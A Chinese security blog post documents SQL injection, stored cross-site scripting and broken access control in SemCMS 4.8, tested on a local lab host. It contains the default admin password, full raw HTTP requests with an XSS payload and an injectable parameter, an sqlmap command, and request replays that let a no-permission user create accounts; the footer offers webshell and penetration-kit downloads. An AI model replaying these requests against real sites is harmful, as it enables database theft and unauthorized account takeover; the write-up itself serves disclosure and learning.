#  semcms存在多处漏洞(水一篇文章)   
原创 自然嗨  嗨嗨安全   2024-11-26 09:14  
  
声明  
  
该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。   
  
  
**前期提要：**  
  
  
该cms的漏洞均已被修复，只探讨寻找漏洞的过程。  
漏洞较为基础  
。  
  
如有侵权！请后台联系，删除文章。  
  
  
 滑至文末,获取“  
searchall  
”下载链接!  
  
  
1.1 介绍  
  
下载链接  
  
cms版本为  
4.8版本（以前挖的了）  
```
http://www.sem-cms.com/
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CicIXicDugvT1QYtYOeeby04UoR7rOnicdicWKKaxsfiaUmbHoTDAgBrJyZtb8xpl4lDZEDAPuoO5ibWUlvicdIcicOKxg/640?wx_fmt=other&from=appmsg "")  
  
```
默认后台密码 Admin/1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CicIXicDugvT1QYtYOeeby04UoR7rOnicdic5AlMC9c3iaVvicX4fxdetnibs2tDWJZ3iaS8ZFFwtaicEiaYEBVzRZqZxg7w/640?wx_fmt=other&from=appmsg "")  
  
  
1.2 semcms存在sql注入  
  
  
在后台浏览时，手工测试发现  
```
http://192.168.112.140/p9aVTG_Admin/SEMCMS_Images.php?tk=tk
```  
  
该界面中的搜索功能存在注入  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CicIXicDugvT1QYtYOeeby04UoR7rOnicdicOXg01iasjNRCrDOzBZFicgf1H4lUkBGDHicfslUicEoXL7fbhhRUBDzibMQ/640?wx_fmt=other&from=appmsg "")  
  
下列请求包中的searchml参数存在  
sql注入  
```
POST /p9aVTG_Admin/SEMCMS_Images.php?tk=tk HTTP/1.1
Host: 192.168.112.140
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 118
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Cookie: scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b
Origin: http://192.168.112.140
Referer: http://192.168.112.140/p9aVTG_Admin/SEMCMS_Images.php
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-Ip: 127.0.0.1
Accept-Encoding: gzip

search=123&searchml=123123
```  
  
  
下面使用  
sqlmap  
进行验证  
```
python2  .\sqlmap.py  -r  .\1.txt  -p searchml  --dbs
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CicIXicDugvT1QYtYOeeby04UoR7rOnicdicmpWWic2cZUP0rUEPgRWeyqTwvuo6SzHBmKKuWhIbQHwYj00FziaEgPibQ/640?wx_fmt=other&from=appmsg "")  
  
  
1.3 semcms存在跨站脚本漏洞  
  
  
在后台浏览时发现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CicIXicDugvT1QYtYOeeby04UoR7rOnicdicX4v6NnZHWrGMCSBArjVWoV9icfziaLS7OUVaULXIribD0X3ytTibXed1pg/640?wx_fmt=other&from=appmsg "")  
  
上传网站logo的功能处上传图片  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CicIXicDugvT1QYtYOeeby04UoR7rOnicdic4wib8nPic8sk4mJcuGFSc9d5d44PMWKwJBJnyRSTrCpiahhvhvibLibia5iaw/640?wx_fmt=other&from=appmsg "")  
  
拦截包  
```
POST /p9aVTG_Admin/SEMCMS_Upfile.php HTTP/1.1
Host: 192.168.112.140
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------3008138927223517928917539185
Content-Length: 919
Origin: http://192.168.112.140
Connection: close
Referer: http://192.168.112.140/p9aVTG_Admin/SEMCMS_Upload.php?Imageurl=../Images/default/&filed=web_logo&filedname=form
Cookie: scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1

-----------------------------3008138927223517928917539185
Content-Disposition: form-data; name="wname"

123
-----------------------------3008138927223517928917539185
Content-Disposition: form-data; name="file"; filename="1.zip"
Content-Type: application/octet-stream

�PNG
123123123123123123123213
-----------------------------3008138927223517928917539185
Content-Disposition: form-data; name="imageurl"

../Images/default/
-----------------------------3008138927223517928917539185
Content-Disposition: form-data; name="filed"

123123</script><script>alert(123123)</script>
-----------------------------3008138927223517928917539185
Content-Disposition: form-data; name="filedname"

form
-----------------------------3008138927223517928917539185
Content-Disposition: form-data; name="submit"

Submit
-----------------------------3008138927223517928917539185--
```  
  
在  
filed  
参数处存在跨站脚本漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CicIXicDugvT1QYtYOeeby04UoR7rOnicdicfAqrfxvFTnLeX6TXn4Z8JYhChh5dIkiaZCYs7URSyksO5cDIsDweVdg/640?wx_fmt=other&from=appmsg "")  
  
‍  
  
出现跨站脚本漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CicIXicDugvT1QYtYOeeby04UoR7rOnicdicj0JCibHRSicbkJPFDu75Nemv6DTGsZ76fRqSH7lHojxcFuMib5jMECTzQ/640?wx_fmt=other&from=appmsg "")  
  
  
  
  
  
  
1.4 semcms存在越权访问  
  
  
首先我利用后台用户管理功能创建任意用户    
  
这里我创建的用户名密码为  
sjw 123456  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CicIXicDugvT1QYtYOeeby04UoR7rOnicdic6ZiaavSaJLkOMMcWsTka0iaS581jQTn96ia9mWbp9rMcVCNDXOwcEVKgQ/640?wx_fmt=other&from=appmsg "")  
‍  
  
并且没有给sjw用户分配任何权限  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CicIXicDugvT1QYtYOeeby04UoR7rOnicdic7zibdJhcbyMqMOUSwgoxIaYn30u3E8EmrnAxTm8iaf7YIibJroXJicwhyw/640?wx_fmt=other&from=appmsg "")  
  
然后保存一下创建账户的请求包  
```
POST /p9aVTG_Admin/SEMCMS_User.php?Class=add&CF=user HTTP/1.1
Host: 192.168.112.140
Content-Length: 108
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.112.140
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.112.140/p9aVTG_Admin/SEMCMS_User.php?type=add
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b
Connection: close

user_name=sjw&user_admin=sjw&user_ps=123456&user_tel=123&user_email=123%40qq.com&submit=%E5%A2%9E%E5%8A%A0
```  
  
这里创建的权限为  
Admin  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CicIXicDugvT1QYtYOeeby04UoR7rOnicdicEKktXGWRVJx97HLxJibEXy1xlfVF1WXj9iaJIwtGqWlhgWTu5jTlwWrg/640?wx_fmt=other&from=appmsg "")  
  
  
然后登录sjw账户，拿到sjw账户的cookie  
  
可以看到sjw并没有任何功能  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CicIXicDugvT1QYtYOeeby04UoR7rOnicdicUkMctuicBjtO121XN8KqhYhv2jNhN9a9blzLoK7gsGOMMibjfFQWCKjg/640?wx_fmt=other&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CicIXicDugvT1QYtYOeeby04UoR7rOnicdicmLMPZlLIvuXNzW9vru5KGwpvkntZ7FdWM2jqXIAyDMRtaaiaMibIc3Jw/640?wx_fmt=other&from=appmsg "")  
```
Cookie: scusername=sjw; scuseradmin=sjw; scuserpass=e10adc3949ba59abbe56e057f20f883e
```  
  
用刚才的请求包替换cookie，创建新用户sjw2  
```
POST /p9aVTG_Admin/SEMCMS_User.php?Class=add&CF=user HTTP/1.1
Host: 192.168.112.140
Content-Length: 108
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.112.140
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.112.140/p9aVTG_Admin/SEMCMS_User.php?type=add
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: scusername=sjw; scuseradmin=sjw; scuserpass=e10adc3949ba59abbe56e057f20f883e
Connection: close

user_name=sjw2&user_admin=sjw2&user_ps=123456&user_tel=123&user_email=123%40qq.com&submit=%E5%A2%9E%E5%8A%A0
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CicIXicDugvT1QYtYOeeby04UoR7rOnicdic8jC5ib382rUcMWDcYY4oIhicSiceIG8QadENYl14EepgJfS0uTZ2aCsuQ/640?wx_fmt=other&from=appmsg "")  
  
再次登录到  
Admin  
账户查看  
  
创建成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CicIXicDugvT1QYtYOeeby04UoR7rOnicdicibiaTZJYE78YERf9DvIzj0PvqNxUKXYHkKsOMeuMcD3gRbicqG56LAqhA/640?wx_fmt=other&from=appmsg "")  
  
  
‍  
  
  
  
  
注：如有侵权请后台联系进行删除  
  
觉得内容不错,请点一下"赞"和"在看"  
  
  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/CicIXicDugvT0be94SBX2Xjicc7EQWqUEIsjjfGf3EnLcpxDEhnnIsHAk8iamibYenPbtqFc5agDKicPYCaM2baH7AIA/640?wx_fmt=gif "")  
  
**点击上方公众号**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/CicIXicDugvT0be94SBX2Xjicc7EQWqUEIsDMibNVAOW0RFtdicgdRFicOovq6LRTaWA43ibOQicbA03vPrEDTtgsoZRPg/640?wx_fmt=png "")  
  
**关注我们**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/CicIXicDugvT0be94SBX2Xjicc7EQWqUEIsjjfGf3EnLcpxDEhnnIsHAk8iamibYenPbtqFc5agDKicPYCaM2baH7AIA/640?wx_fmt=gif "")  
****  
****  
****  
****  
****  
****  
****  
****  
  
往期精彩  
  
[Armitage|MSF图形界面神器](http://mp.weixin.qq.com/s?__biz=MzIzMjg0MjM5OQ==&mid=2247486181&idx=1&sn=4c722bba9e0808d7393ba975ccf6b826&chksm=e88fff15dff87603e4a5aa669ef612cc941c6b7ee406fa2fb0d2dc57242b9331f2c2f2adb121&scene=21#wechat_redirect)  
  
  
[原创|Searchall3.5.11敏感信息搜索工具](https://mp.weixin.qq.com/s?__biz=MzIzMjg0MjM5OQ==&mid=2247487868&idx=1&sn=a81c784e26f8d615f895fe112db4cf19&scene=21#wechat_redirect)  
  
  
[快看！渗透测试工具库！](https://mp.weixin.qq.com/s?__biz=MzIzMjg0MjM5OQ==&mid=2247487868&idx=1&sn=a81c784e26f8d615f895fe112db4cf19&scene=21#wechat_redirect)  
  
  
  
  
1、公众号后台回复：  
搜索大法，获取searchall工具下载链接。  
  
2、公众号后台回复：  
靶场，获取靶场工具网盘下载链接。  
  
3、公众号后台回复：  
webshell，获取webshell下载链接。  
  
4、公众号后台回复：  
验证码  
，获取验证码工具下载链接。  
  
5.公众号后台回复：  
应急响应  
，获取应急响应网盘下载链接。  
  
6.公众号后台回复：  
CS，获取CS渗透工具包网盘下载链接。  
  
7.  
公众号点菜单栏"  
工具合集  
"，后台回复"  
嗨  
"即可获取！  
  
